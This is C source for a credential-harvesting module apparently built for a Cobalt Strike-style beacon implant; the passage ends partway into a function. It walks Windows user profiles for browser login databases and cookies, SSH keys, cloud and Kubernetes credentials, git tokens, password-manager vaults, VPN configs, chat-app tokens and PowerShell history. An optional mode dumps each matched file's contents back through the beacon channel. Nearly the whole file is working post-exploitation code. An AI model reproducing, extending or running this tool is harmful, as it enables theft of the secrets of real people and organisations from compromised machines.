#include <windows.h>
#include "beacon.h"

/**
 * Credential Enumeration BOF (enum-creds)
 *
 * Unified file enumeration for credential and application data discovery.
 * Consolidates enum-appdata, enum-browser-creds, enum-credfiles, and
 * enum-consolehistory into a single BOF with bitmask-based group selection.
 *
 * Groups:
 *   APPDATA  (0x01) - Database clients, chat apps, browser extensions
 *   BROWSER  (0x02) - Firefox/Chrome/Edge credential stores
 *   CREDS    (0x04) - SSH keys, cloud creds, git configs, password managers, VPN
 *   HISTORY  (0x08) - PowerShell console history (PSReadLine)
 *
 * SAFETY NOTES:
 * - Maximum path length: 512 characters
 * - Read-only operations (no file modifications)
 * - Heap allocation for large buffers
 */

// Safety and configuration limits
#define MAX_PATH_LENGTH 512
#define MAX_RECURSION_DEPTH 20
#define MAX_FILES 50000
#define DUMP_CHUNK_SIZE 32768
#define DUMP_MAX_HARD_LIMIT 1048576
#define MAX_TRANSCRIPT_FILES 200

// Top-level group flags (argument bitmask)
#define GROUP_APPDATA   0x01
#define GROUP_BROWSER   0x02
#define GROUP_CREDS     0x04
#define GROUP_HISTORY   0x08
#define GROUP_DEFAULT   (GROUP_BROWSER | GROUP_CREDS | GROUP_HISTORY)
#define GROUP_ALL       0xFF

// Sub-type flags for APPDATA group
#define APP_TYPE_DATABASE   0x01
#define APP_TYPE_CHAT       0x02
#define APP_TYPE_BROWSER_EXT 0x04

// Sub-type flags for CREDS group
#define CRED_TYPE_SSH       0x01
#define CRED_TYPE_CLOUD     0x02
#define CRED_TYPE_GIT       0x04
#define CRED_TYPE_PASSWORD  0x08
#define CRED_TYPE_VPN       0x10
#define CRED_TYPE_SETUP     0x20

// Statistics structure
typedef struct {
    DWORD fileCount;
    ULONGLONG totalSize;
    // APPDATA counters
    DWORD databaseCount;
    DWORD chatCount;
    DWORD browserExtCount;
    // BROWSER counters
    DWORD browserCredCount;
    // CREDS counters
    DWORD sshCount;
    DWORD cloudCount;
    DWORD gitCount;
    DWORD passwordCount;
    DWORD vpnCount;
    DWORD setupCount;
    // HISTORY counters
    DWORD historyCount;
    DWORD transcriptReported;
    // Enumeration limit
    DWORD totalEnumerated;
    // Content dump: 0 = off, otherwise max bytes printed per matched file
    DWORD dumpMaxBytes;
} EnumStats;

// Forward declarations
void SearchDirectory(LPWSTR basePath, DWORD groupFlags, DWORD subFlags,
                     int currentDepth, EnumStats* stats);
BOOL MatchesPattern(LPCWSTR fileName, LPCWSTR filePath, DWORD groupFlags,
                    DWORD subFlags, LPSTR typeOut, int typeOutSize);
BOOL ReportMatchedPath(LPCWSTR filePath, LPCSTR fileType, EnumStats* stats);
void DumpFileContents(LPCWSTR filePath, DWORD maxBytes);
void UpdateStatsForType(LPCSTR fileType, ULONGLONG fileSize, EnumStats* stats);
void FormatFileSize(ULONGLONG size, char* buffer, int bufferSize);
void FormatFileTime(const FILETIME* ft, char* buffer, int bufferSize);
int WideCharToUtf8(LPCWSTR wide, char* buffer, int bufferSize);
BOOL StartsWithInsensitiveW(LPCWSTR value, LPCWSTR prefix);
BOOL ShouldSkipUserDirectory(LPCWSTR dirName);
BOOL IsUsersRootPath(LPCWSTR path);
BOOL ShouldSkipDirectory(LPCWSTR basePath, LPCWSTR dirName,
                         DWORD attributes, int currentDepth);
BOOL TryBuildUserBasePath(LPCWSTR searchPath, LPWSTR userBasePath, int pathSize);
BOOL IsChromiumProfileDirectory(LPCWSTR dirName);
void CheckConsoleHistoryForUser(LPCWSTR userBasePath, EnumStats* stats);
void ReportTranscriptsInDirectory(LPCWSTR dir, BOOL recurseOneLevel, EnumStats* stats);
void CheckTranscriptPolicy(EnumStats* stats);
void CheckSystemSetupArtifacts(EnumStats* stats);
void CheckFirefoxArtifactsForUser(LPCWSTR userBasePath, EnumStats* stats);
void CheckChromiumArtifactsForUser(LPCWSTR userBasePath, LPCWSTR browserRootSuffix,
                                   LPCSTR localStateType, LPCSTR cookiesType,
                                   LPCSTR loginType, EnumStats* stats);
BOOL RunTargetedUserEnumeration(LPCWSTR searchPath, DWORD groupFlags, EnumStats* stats);

/* ------------------------------------------------------------------ */
/* Case-insensitive wide-string helpers (ASCII-only)                  */
/* ------------------------------------------------------------------ */

WCHAR ToLowerAsciiW(WCHAR c) {
    if (c >= L'A' && c <= L'Z') return c + (L'a' - L'A');
    return c;
}

BOOL EqualsInsensitiveW(LPCWSTR lhs, LPCWSTR rhs) {
    int i = 0;
    while (lhs[i] != L'\0' && rhs[i] != L'\0') {
        if (ToLowerAsciiW(lhs[i]) != ToLowerAsciiW(rhs[i])) return FALSE;
        i++;
    }
    return lhs[i] == L'\0' && rhs[i] == L'\0';
}

BOOL EndsWithInsensitiveW(LPCWSTR value, LPCWSTR suffix) {
    int valueLen = lstrlenW(value);
    int suffixLen = lstrlenW(suffix);
    int offset;
    if (suffixLen > valueLen) return FALSE;
    offset = valueLen - suffixLen;
    for (int i = 0; i < suffixLen; i++) {
        if (ToLowerAsciiW(value[offset + i]) != ToLowerAsciiW(suffix[i]))
            return FALSE;
    }
    return TRUE;
}

BOOL ContainsInsensitiveW(LPCWSTR haystack, LPCWSTR needle) {
    int haystackLen = lstrlenW(haystack);
    int needleLen = lstrlenW(needle);
    if (needleLen == 0) return TRUE;
    if (needleLen > haystackLen) return FALSE;
    for (int i = 0; i <= haystackLen - needleLen; i++) {
        BOOL matched = TRUE;
        for (int j = 0; j < needleLen; j++) {
            if (ToLowerAsciiW(haystack[i + j]) != ToLowerAsciiW(needle[j])) {
                matched = FALSE;
                break;
            }
        }
        if (matched) return TRUE;
    }
    return FALSE;
}

BOOL StartsWithInsensitiveW(LPCWSTR value, LPCWSTR prefix) {
    int i = 0;
    while (prefix[i] != L'\0') {
        if (value[i] == L'\0') return FALSE;
        if (ToLowerAsciiW(value[i]) != ToLowerAsciiW(prefix[i])) return FALSE;
        i++;
    }
    return TRUE;
}

/* ------------------------------------------------------------------ */
/* Safe wide-string operations                                        */
/* ------------------------------------------------------------------ */

BOOL SafeCopyW(LPWSTR dest, LPCWSTR src, int destSize) {
    int srcLen = lstrlenW(src);
    if (srcLen + 1 > destSize) return FALSE;
    lstrcpyW(dest, src);
    return TRUE;
}

BOOL SafeConcatW(LPWSTR dest, LPCWSTR src, int destSize) {
    int destLen = lstrlenW(dest);
    int srcLen = lstrlenW(src);
    if (destLen + srcLen + 1 > destSize) return FALSE;
    lstrcatW(dest, src);
    return TRUE;
}

/* ------------------------------------------------------------------ */
/* Directory traversal filters                                        */
/* ------------------------------------------------------------------ */

BOOL ShouldSkipUserDirectory(LPCWSTR dirName) {
    if (EqualsInsensitiveW(dirName, L"Public")) return TRUE;
    if (EqualsInsensitiveW(dirName, L"Default")) return TRUE;
    if (EqualsInsensitiveW(dirName, L"Default User")) return TRUE;
    if (EqualsInsensitiveW(dirName, L"All Users")) return TRUE;
    if (EqualsInsensitiveW(dirName, L".") || EqualsInsensitiveW(dirName, L".."))
        return TRUE;
    return FALSE;
}

BOOL IsUsersRootPath(LPCWSTR path) {
    if (!path || path[0] == L'\0') return FALSE;
    return EqualsInsensitiveW(path, L"C:\\Users") ||
           EqualsInsensitiveW(path, L"C:\\Users\\") ||
           EndsWithInsensitiveW(path, L"\\Users") ||
           EndsWithInsensitiveW(path, L"\\Users\\");
}

BOOL ShouldSkipDirectory(LPCWSTR basePath, LPCWSTR dirName,
                         DWORD attributes, int currentDepth) {
    if (attributes & FILE_ATTRIBUTE_REPARSE_POINT) return TRUE;
    if (attributes & FILE_ATTRIBUTE_SYSTEM) return TRUE;

    /*
     * Hidden profile data such as AppData contains most of the files we care
     * about, so do not skip hidden directories globally. Only skip hidden and
     * default profile entries when we are enumerating the C:\Users root.
     */
    if (currentDepth == 0 && IsUsersRootPath(basePath)) {
        if (attributes & FILE_ATTRIBUTE_HIDDEN) return TRUE;
        if (ShouldSkipUserDirectory(dirName)) return TRUE;
    }

    return FALSE;
}

BOOL TryBuildUserBasePath(LPCWSTR searchPath, LPWSTR userBasePath, int pathSize) {
    const WCHAR* prefix = L"C:\\Users\\";
    int prefixLen = lstrlenW(prefix);
    int i = 0;
    int outPos = 0;

    if (!searchPath || !StartsWithInsensitiveW(searchPath, prefix)) {
        return FALSE;
    }

    if (!SafeCopyW(userBasePath, prefix, pathSize)) {
        return FALSE;
    }
    outPos = prefixLen;

    while (searchPath[prefixLen + i] != L'\0' &&
           searchPath[prefixLen + i] != L'\\' &&
           searchPath[prefixLen + i] != L'/') {
        if (outPos + 1 >= pathSize) return FALSE;
        userBasePath[outPos++] = searchPath[prefixLen + i];
        i++;
    }

    if (i == 0) return FALSE;

    userBasePath[outPos] = L'\0';
    return TRUE;
}

BOOL IsChromiumProfileDirectory(LPCWSTR dirName) {
    return EqualsInsensitiveW(dirName, L"Default") ||
           StartsWithInsensitiveW(dirName, L"Profile ");
}

/* ------------------------------------------------------------------ */
/* Pattern matching: APPDATA group                                    */
/* ------------------------------------------------------------------ */

static BOOL MatchesAppData(LPCWSTR fileName, LPCWSTR filePath,
                           DWORD subFlags, LPSTR typeOut, int typeOutSize) {
    int fileNameLen = lstrlenW(fileName);

    // Database Clients
    if (subFlags & APP_TYPE_DATABASE) {
        if (EqualsInsensitiveW(fileName, L"SqlStudio.bin")) {
            if (ContainsInsensitiveW(filePath, L"SQL Server Management Studio")) {
                _snprintf(typeOut, typeOutSize, "SSMS_CONFIG");
                return TRUE;
            }
        }
        if (EqualsInsensitiveW(fileName, L"connections.xml")) {
            if (ContainsInsensitiveW(filePath, L"MySQL\\Workbench")) {
                _snprintf(typeOut, typeOutSize, "MYSQL_WORKBENCH");
                return TRUE;
            }
        }
        if (EqualsInsensitiveW(fileName, L"credentials-config.json")) {
            if (ContainsInsensitiveW(filePath, L"DBeaverData")) {
                _snprintf(typeOut, typeOutSize, "DBEAVER_CREDENTIALS");
                return TRUE;
            }
        }
        if (EqualsInsensitiveW(fileName, L"data-sources.json")) {
            if (ContainsInsensitiveW(filePath, L"DBeaverData")) {
                _snprintf(typeOut, typeOutSize, "DBEAVER_DATASOURCES");
                return TRUE;
            }
        }
        if (EqualsInsensitiveW(fileName, L"pgpass")) {
            if (ContainsInsensitiveW(filePath, L"pgAdmin")) {
                _snprintf(typeOut, typeOutSize, "PGADMIN_PASSWORDS");
                return TRUE;
            }
        }
        if (EqualsInsensitiveW(fileName, L"database.xml")) {
            if (ContainsInsensitiveW(filePath, L"DataGrip") ||
                ContainsInsensitiveW(filePath, L"JetBrains")) {
                _snprintf(typeOut, typeOutSize, "DATAGRIP_CONFIG");
                return TRUE;
            }
        }
    }

    // Chat Applications
    if (subFlags & APP_TYPE_CHAT) {
        if (EqualsInsensitiveW(fileName, L"Cookies")) {
            if (ContainsInsensitiveW(filePath, L"\\Slack\\")) {
                _snprintf(typeOut, typeOutSize, "SLACK_COOKIES");
                return TRUE;
            }
            if (ContainsInsensitiveW(filePath, L"\\Teams\\")) {
                _snprintf(typeOut, typeOutSize, "TEAMS_COOKIES");
                return TRUE;
            }
        }
        if (fileNameLen >= 4 && EndsWithInsensitiveW(fileName, L".ldb")) {
            if (ContainsInsensitiveW(filePath, L"\\discord\\Local Storage\\leveldb\\")) {
                _snprintf(typeOut, typeOutSize, "DISCORD_LEVELDB");
                return TRUE;
            }
            if (ContainsInsensitiveW(filePath, L"\\Slack\\Local Storage\\leveldb\\")) {
                _snprintf(typeOut, typeOutSize, "SLACK_LEVELDB");
                return TRUE;
            }
            if (ContainsInsensitiveW(filePath, L"\\Teams\\Local Storage\\leveldb\\")) {
                _snprintf(typeOut, typeOutSize, "TEAMS_LEVELDB");
                return TRUE;
            }
        }
    }

    // Browser Extensions
    if (subFlags & APP_TYPE_BROWSER_EXT) {
        if (EqualsInsensitiveW(fileName, L"manifest.json")) {
            if (ContainsInsensitiveW(filePath, L"\\Chrome\\User Data\\") &&
                ContainsInsensitiveW(filePath, L"\\Extensions\\")) {
                _snprintf(typeOut, typeOutSize, "CHROME_EXTENSIONS");
                return TRUE;
            }
            if (ContainsInsensitiveW(filePath, L"\\Edge\\User Data\\") &&
                ContainsInsensitiveW(filePath, L"\\Extensions\\")) {
                _snprintf(typeOut, typeOutSize, "EDGE_EXTENSIONS");
                return TRUE;
            }
        }
        if (EqualsInsensitiveW(fileName, L"extensions.json")) {
            if (ContainsInsensitiveW(filePath, L"\\Firefox\\Profiles\\")) {
                _snprintf(typeOut, typeOutSize, "FIREFOX_EXTENSIONS");
                return TRUE;
            }
        }
    }

    return FALSE;
}

/* ------------------------------------------------------------------ */
/* Pattern matching: BROWSER group                                    */
/* ------------------------------------------------------------------ */

static BOOL MatchesBrowserCreds(LPCWSTR fileName, LPCWSTR filePath,
                                LPSTR typeOut, int typeOutSize) {
    // Firefox credential files
    if (EqualsInsensitiveW(fileName, L"logins.json")) {
        if (ContainsInsensitiveW(filePath, L"\\Firefox\\Profiles\\")) {
            _snprintf(typeOut, typeOutSize, "FIREFOX_LOGINS");
            return TRUE;
        }
    }
    if (EqualsInsensitiveW(fileName, L"key4.db")) {
        if (ContainsInsensitiveW(filePath, L"\\Firefox\\Profiles\\")) {
            _snprintf(typeOut, typeOutSize, "FIREFOX_KEY_DB");
            return TRUE;
        }
    }

    // Chrome credential files
    if (EqualsInsensitiveW(fileName, L"Local State")) {
        if (EndsWithInsensitiveW(filePath, L"\\Google\\Chrome\\User Data\\Local State")) {
            _snprintf(typeOut, typeOutSize, "CHROME_LOCAL_STATE");
            return TRUE;
        }
        if (EndsWithInsensitiveW(filePath, L"\\Microsoft\\Edge\\User Data\\Local State")) {
            _snprintf(typeOut, typeOutSize, "EDGE_LOCAL_STATE");
            return TRUE;
        }
    }
    if (EqualsInsensitiveW(fileName, L"Cookies")) {
        if (EndsWithInsensitiveW(filePath, L"\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")) {
            _snprintf(typeOut, typeOutSize, "CHROME_COOKIES");
            return TRUE;
        }
        if (EndsWithInsensitiveW(filePath, L"\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies")) {
            _snprintf(typeOut, typeOutSize, "EDGE_COOKIES");
            return TRUE;
        }
    }
    if (EqualsInsensitiveW(fileName, L"Login Data")) {
        if (EndsWithInsensitiveW(filePath, L"\\Google\\Chrome\\User Data\\Default\\Login Data")) {
            _snprintf(typeOut, typeOutSize, "CHROME_LOGIN_DATA");
            return TRUE;
        }
        if (EndsWithInsensitiveW(filePath, L"\\Microsoft\\Edge\\User Data\\Default\\Login Data")) {
            _snprintf(typeOut, typeOutSize, "EDGE_LOGIN_DATA");
            return TRUE;
        }
    }

    return FALSE;
}

/* ------------------------------------------------------------------ */
/* Pattern matching: CREDS group                                      */
/* ------------------------------------------------------------------ */

static BOOL MatchesCredFiles(LPCWSTR fileName, LPCWSTR filePath,
                             DWORD subFlags, LPSTR typeOut, int typeOutSize) {
    int fileNameLen = lstrlenW(fileName);

    // SSH Keys
    if (subFlags & CRED_TYPE_SSH) {
        if (EqualsInsensitiveW(fileName, L"id_rsa") ||
            EqualsInsensitiveW(fileName, L"id_ed25519") ||
            EqualsInsensitiveW(fileName, L"id_ecdsa") ||
            EqualsInsensitiveW(fileName, L"id_dsa")) {
            _snprintf(typeOut, typeOutSize, "SSH_PRIVATE_KEY");
            return TRUE;
        }
        if (fileNameLen >= 4 && EndsWithInsensitiveW(fileName, L".ppk")) {
            _snprintf(typeOut, typeOutSize, "SSH_PUTTY_KEY");
            return TRUE;
        }
    }

    // Cloud Credentials
    if (subFlags & CRED_TYPE_CLOUD) {
        if (EqualsInsensitiveW(fileName, L"credentials") ||
            EqualsInsensitiveW(fileName, L"config")) {
            if (ContainsInsensitiveW(filePath, L".aws\\")) {
                _snprintf(typeOut, typeOutSize, "AWS_CREDENTIALS");
                return TRUE;
            }
        }
        if (EqualsInsensitiveW(fileName, L"TokenCache.dat") ||
            EqualsInsensitiveW(fileName, L"AzureRmContext.json")) {
            _snprintf(typeOut, typeOutSize, "AZURE_CREDENTIALS");
            return TRUE;
        }
        if (EqualsInsensitiveW(fileName, L"application_default_credentials.json") ||
            EqualsInsensitiveW(fileName, L"credentials.db")) {
            if (ContainsInsensitiveW(filePath, L"gcloud")) {
                _snprintf(typeOut, typeOutSize, "GCP_CREDENTIALS");
                return TRUE;
            }
        }
        if (EqualsInsensitiveW(fileName, L"config")) {
            if (ContainsInsensitiveW(filePath, L".kube\\")) {
                _snprintf(typeOut, typeOutSize, "KUBERNETES_CONFIG");
                return TRUE;
            }
        }
    }

    // Git Credentials
    if (subFlags & CRED_TYPE_GIT) {
        if (EqualsInsensitiveW(fileName, L".git-credentials") ||
            EqualsInsensitiveW(fileName, L".gitconfig")) {
            _snprintf(typeOut, typeOutSize, "GIT_CREDENTIALS");
            return TRUE;
        }
        if (EqualsInsensitiveW(fileName, L"config")) {
            if (ContainsInsensitiveW(filePath, L".git\\")) {
                _snprintf(typeOut, typeOutSize, "GIT_CONFIG");
                return TRUE;
            }
        }
    }

    // Password Manager Databases
    if (subFlags & CRED_TYPE_PASSWORD) {
        if (fileNameLen >= 5 && EndsWithInsensitiveW(fileName, L".kdbx")) {
            _snprintf(typeOut, typeOutSize, "KEEPASS_DATABASE");
            return TRUE;
        }
        if (fileNameLen >= 8 && EndsWithInsensitiveW(fileName, L".opvault")) {
            _snprintf(typeOut, typeOutSize, "1PASSWORD_VAULT");
            return TRUE;
        }
        if (fileNameLen >= 14 && EndsWithInsensitiveW(fileName, L".agilekeychain")) {
            _snprintf(typeOut, typeOutSize, "1PASSWORD_KEYCHAIN");
            return TRUE;
        }
    }

    // VPN Configurations
    if (subFlags & CRED_TYPE_VPN) {
        if (fileNameLen >= 5 && EndsWithInsensitiveW(fileName, L".ovpn")) {
            _snprintf(typeOut, typeOutSize, "OPENVPN_CONFIG");
            return TRUE;
        }
        if (fileNameLen >= 5 && EndsWithInsensitiveW(fileName, L".conf")) {
            if (fileNameLen >= 7 &&
                ToLowerAsciiW(fileName[0]) == L'w' &&
                ToLowerAsciiW(fileName[1]) == L'g') {
                _snprintf(typeOut, typeOutSize, "WIREGUARD_CONFIG");
                return TRUE;
            }
        }
        if (fileNameLen >= 4 && EndsWithInsensitiveW(fileName, L".pcf")) {
            _snprintf(typeOut, typeOutSize, "CISCO_VPN_CONFIG");
            return TRUE;
        }
        if (EqualsInsensitiveW(fileName, L"vpn_config.xml")) {
            _snprintf(typeOut, typeOutSize, "FORTINET_VPN_CONFIG");
            return TRUE;
        }
    }

    return FALSE;
}

/* ------------------------------------------------------------------ */
/* Pattern matching: HISTORY group                                    */
/* ------------------------------------------------------------------ */

static BOOL MatchesHistory(LPCWSTR fileName, LPCWSTR filePath,
                           LPSTR typeOut, int typeOutSize) {
    if (EqualsInsensitiveW(fileName, L"ConsoleHost_history.txt")) {
        if (EndsWithInsensitiveW(
                filePath,
                L"\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")) {
            _snprintf(typeOut, typeOutSize, "PS_HISTORY");
            return TRUE;
        }
    }
    return FALSE;
}

/* ------------------------------------------------------------------ */
/* Unified pattern matching dispatcher                                */
/* ------------------------------------------------------------------ */

BOOL MatchesPattern(LPCWSTR fileName, LPCWSTR filePath, DWORD groupFlags,
                    DWORD subFlags, LPSTR typeOut, int typeOutSize) {
    if ((groupFlags & GROUP_APPDATA) &&
        MatchesAppData(fileName, filePath, subFlags, typeOut, typeOutSize))
        return TRUE;

    if ((groupFlags & GROUP_BROWSER) &&
        MatchesBrowserCreds(fileName, filePath, typeOut, typeOutSize))
        return TRUE;

    if ((groupFlags & GROUP_CREDS) &&
        MatchesCredFiles(fileName, filePath, subFlags, typeOut, typeOutSize))
        return TRUE;

    if ((groupFlags & GROUP_HISTORY) &&
        MatchesHistory(fileName, filePath, typeOut, typeOutSize))
        return TRUE;

    return FALSE;
}

/* ------------------------------------------------------------------ */
/* Result reporting and targeted profile checks                        */
/* ------------------------------------------------------------------ */

void UpdateStatsForType(LPCSTR fileType, ULONGLONG fileSize, EnumStats* stats) {
    stats->fileCount++;
    stats->totalSize += fileSize;

    if ((fileType[0] == 'S' && fileType[1] == 'S' && fileType[2] == 'M') ||
        (fileType[0] == 'M' && fileType[1] == 'Y' && fileType[2] == 'S') ||
        (fileType[0] == 'D' && fileType[1] == 'B' && fileType[2] == 'E') ||
        (fileType[0] == 'P' && fileType[1] == 'G' && fileType[2] == 'A') ||
        (fileType[0] == 'D' && fileType[1] == 'A' && fileType[2] == 'T' && fileType[3] == 'A')) {
        stats->databaseCount++;
    }
    else if ((fileType[0] == 'S' && fileType[1] == 'L' && fileType[2] == 'A') ||
             (fileType[0] == 'T' && fileType[1] == 'E' && fileType[2] == 'A') ||
             (fileType[0] == 'D' && fileType[1] == 'I' && fileType[2] == 'S')) {
        stats->chatCount++;
    }
    else if ((fileType[0] == 'C' && fileType[1] == 'H' && fileType[2] == 'R' && fileType[3] == 'O' && fileType[4] == 'M' && fileType[5] == 'E' && fileType[6] == '_' && fileType[7] == 'E') ||
             (fileType[0] == 'E' && fileType[1] == 'D' && fileType[2] == 'G' && fileType[3] == 'E' && fileType[4] == '_' && fileType[5] == 'E') ||
             (fileType[0] == 'F' && fileType[1] == 'I' && fileType[2] == 'R' && fileType[3] == 'E' && fileType[4] == 'F' && fileType[5] == 'O' && fileType[6] == 'X' && fileType[7] == '_' && fileType[8] == 'E')) {
        stats->browserExtCount++;
    }
    else if ((fileType[0] == 'F' && fileType[1] == 'I' && fileType[2] == 'R') ||
             (fileType[0] == 'C' && fileType[1] == 'H' && fileType[2] == 'R') ||
             (fileType[0] == 'E' && fileType[1] == 'D' && fileType[2] == 'G')) {
        stats->browserCredCount++;
    }
    else if (fileType[0] == 'S' && fileType[1] == 'S' && fileType[2] == 'H') {
        stats->sshCount++;
    }
    else if (fileType[0] == 'G' && fileType[1] == 'I' && fileType[2] == 'T') {
        stats->gitCount++;
    }
    else if ((fileType[0] == 'K' && fileType[1] == 'E' && fileType[2] == 'E') ||
             fileType[0] == '1') {
        stats->passwordCount++;
    }
    else if ((fileType[0] == 'A' && fileType[1] == 'W' && fileType[2] == 'S') ||
             (fileType[0] == 'A' && fileType[1] == 'Z' && fileType[2] == 'U') ||
             (fileType[0] == 'G' && fileType[1] == 'C' && fileType[2] == 'P') ||
             (fileType[0] == 'K' && fileType[1] == 'U' && fileType[2] == 'B')) {
        stats->cloudCount++;
    }
    else if (fileType[0] == 'P' && fileType[1] == 'S' && fileType[2] == '_') {
        stats->historyCount++;
    }
    else if ((fileType[0] == 'U' && fileType[1] == 'N' && fileType[2] == 'A') ||
             (fileType[0] == 'S' && fileType[1] == 'Y' && fileType[2] == 'S')) {
        stats->setupCount++;
    }
    else {
        stats->vpnCount++;
    }
}

void DumpFileContents(LPCWSTR filePath, DWORD maxBytes) {
    HANDLE hHeap = GetProcessHeap();
    HANDLE hFile = INVALID_HANDLE_VALUE;
    char* chunk = NULL;
    LARGE_INTEGER fileSize;
    DWORD bytesRemaining;
    DWORD firstRead = 0;
    DWORD i;
    BOOL truncated = FALSE;
    BOOL utf16 = FALSE;
    char lastByte = '\0';
    BOOL sawOutput = FALSE;

    hFile = CreateFileW(filePath, GENERIC_READ,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "    [dump] open failed: %lu\n", GetLastError());
        return;
    }

    if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart < 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "    [dump] size query failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (fileSize.QuadPart == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "    [dump] empty file\n");
        goto cleanup;
    }

    bytesRemaining = (DWORD)fileSize.QuadPart;
    if (fileSize.QuadPart > (LONGLONG)maxBytes) {
        bytesRemaining = maxBytes;
        truncated = TRUE;
    }

    chunk = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, DUMP_CHUNK_SIZE);
    if (!chunk) {
        BeaconPrintf(CALLBACK_OUTPUT, "    [dump] allocation failed\n");
        goto cleanup;
    }

    // Sniff the first chunk: UTF-16LE BOM is text, any other NUL byte is binary.
    {
        DWORD request = bytesRemaining > DUMP_CHUNK_SIZE ? DUMP_CHUNK_SIZE : bytesRemaining;
        if (!ReadFile(hFile, chunk, request, &firstRead, NULL) || firstRead == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "    [dump] read failed: %lu\n", GetLastError());
            goto cleanup;
        }
    }

    if (firstRead >= 2 && (BYTE)chunk[0] == 0xFF && (BYTE)chunk[1] == 0xFE) {
        utf16 = TRUE;
    } else {
        for (i = 0; i < firstRead; i++) {
            if (chunk[i] == '\0') {
                BeaconPrintf(CALLBACK_OUTPUT, "    [dump] skipped: binary content\n");
                goto cleanup;
            }
        }
    }

    if (truncated) {
        BeaconPrintf(CALLBACK_OUTPUT, "    [dump] BEGIN (first %lu of %lu bytes)\n",
                     bytesRemaining, (DWORD)fileSize.QuadPart);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "    [dump] BEGIN (%lu bytes)\n", bytesRemaining);
    }

    if (utf16) {
        // Read the whole capped range, then convert once.
        DWORD wideBytes = bytesRemaining;
        BYTE* wideBuf = (BYTE*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, wideBytes + 2);
        char* utf8Buf = NULL;
        DWORD got = firstRead;

        if (!wideBuf) {
            BeaconPrintf(CALLBACK_OUTPUT, "    [dump] allocation failed\n");
            goto cleanup;
        }
        for (i = 0; i < firstRead; i++) wideBuf[i] = (BYTE)chunk[i];
        while (got < wideBytes) {
            DWORD request = (wideBytes - got) > DUMP_CHUNK_SIZE ? DUMP_CHUNK_SIZE : (wideBytes - got);
            DWORD n = 0;
            if (!ReadFile(hFile, wideBuf + got, request, &n, NULL) || n == 0) break;
            got += n;
        }
        // Drop a trailing odd byte so the wide string is well formed.
        got &= ~1u;
        wideBuf[got] = 0;
        wideBuf[got + 1] = 0;

        utf8Buf = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (got / 2) * 3 + 1);
        if (utf8Buf) {
            // Skip the BOM code unit.
            int n = WideCharToUtf8((LPCWSTR)(wideBuf + 2), utf8Buf, (got / 2) * 3 + 1);
            if (n > 0) {
                BeaconOutput(CALLBACK_OUTPUT, utf8Buf, n);
                lastByte = utf8Buf[n - 1];
                sawOutput = TRUE;
            }
            HeapFree(hHeap, 0, utf8Buf);
        }
        HeapFree(hHeap, 0, wideBuf);
    } else {
        BeaconOutput(CALLBACK_OUTPUT, chunk, firstRead);
        lastByte = chunk[firstRead - 1];
        sawOutput = TRUE;
        bytesRemaining -= firstRead;

        while (bytesRemaining > 0) {
            DWORD request = bytesRemaining > DUMP_CHUNK_SIZE ? DUMP_CHUNK_SIZE : bytesRemaining;
            DWORD n = 0;
            if (!ReadFile(hFile, chunk, request, &n, NULL) || n == 0) break;
            BeaconOutput(CALLBACK_OUTPUT, chunk, n);
            lastByte = chunk[n - 1];
            bytesRemaining -= n;
        }
    }

    if (!sawOutput || lastByte != '\n') {
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }
    BeaconPrintf(CALLBACK_OUTPUT, "    [dump] END\n");

cleanup:
    if (chunk) HeapFree(hHeap, 0, chunk);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
}

BOOL ReportMatchedPath(LPCWSTR filePath, LPCSTR fileType, EnumStats* stats) {
    WIN32_FIND_DATAW findData;
    HANDLE hFind;
    ULONGLONG fileSize;
    char timestamp[32];
    char sizeStr[32];
    char* pathUtf8;

    stats->totalEnumerated++;

    hFind = FindFirstFileW(filePath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    FindClose(hFind);

    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        return FALSE;
    }

    fileSize = ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;
    FormatFileTime(&findData.ftLastWriteTime, timestamp, sizeof(timestamp));
    FormatFileSize(fileSize, sizeStr, sizeof(sizeStr));

    pathUtf8 = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2048);
    if (pathUtf8) {
        WideCharToUtf8(filePath, pathUtf8, 2048);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[%s] %s\n    Size: %s | Modified: %s\n",
            fileType, pathUtf8, sizeStr, timestamp);
        HeapFree(GetProcessHeap(), 0, pathUtf8);
    }

    UpdateStatsForType(fileType, fileSize, stats);
    if (stats->dumpMaxBytes > 0) {
        DumpFileContents(filePath, stats->dumpMaxBytes);
    }
    return TRUE;
}

void CheckConsoleHistoryForUser(LPCWSTR userBasePath, EnumStats* stats) {
    WCHAR historyPath[MAX_PATH_LENGTH];

    if (!SafeCopyW(historyPath, userBasePath, MAX_PATH_LENGTH)) return;
    if (SafeConcatW(historyPath,
                    L"\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
                    MAX_PATH_LENGTH)) {
        ReportMatchedPath(historyPath, "PS_HISTORY", stats);
    }

    // Start-Transcript without a path, and transcription policy without an
    // OutputDirectory, both write to the user's Documents folder.
    if (!SafeCopyW(historyPath, userBasePath, MAX_PATH_LENGTH)) return;
    if (SafeConcatW(historyPath, L"\\Documents", MAX_PATH_LENGTH)) {
        ReportTranscriptsInDirectory(historyPath, FALSE, stats);
    }
}

void ReportTranscriptsInDirectory(LPCWSTR dir, BOOL recurseOneLevel, EnumStats* stats) {
    HANDLE hHeap = GetProcessHeap();
